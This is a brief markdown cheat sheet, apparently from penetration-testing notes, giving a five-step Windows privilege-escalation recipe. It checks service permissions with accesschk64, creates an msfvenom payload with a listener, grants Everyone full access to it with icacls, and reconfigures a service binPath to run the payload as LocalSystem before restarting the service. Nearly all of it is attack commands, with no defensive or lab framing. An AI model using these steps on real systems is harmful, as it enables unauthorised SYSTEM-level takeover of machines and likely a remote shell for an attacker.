# Example:

### 1: Use accesschk64.exe (sysinternals)

### accesschk64.exe -qlc SERVICE

### 2: msfvenom payload, then setup listener

### 3: Grant full access to payload 

### icacls c:\path\to\payload.exe /grant Everyone:F

### 4: sc config SERVICE binPath="c:\path\to\payload.exe" obj= LocalSystem

### 5: Restart Service
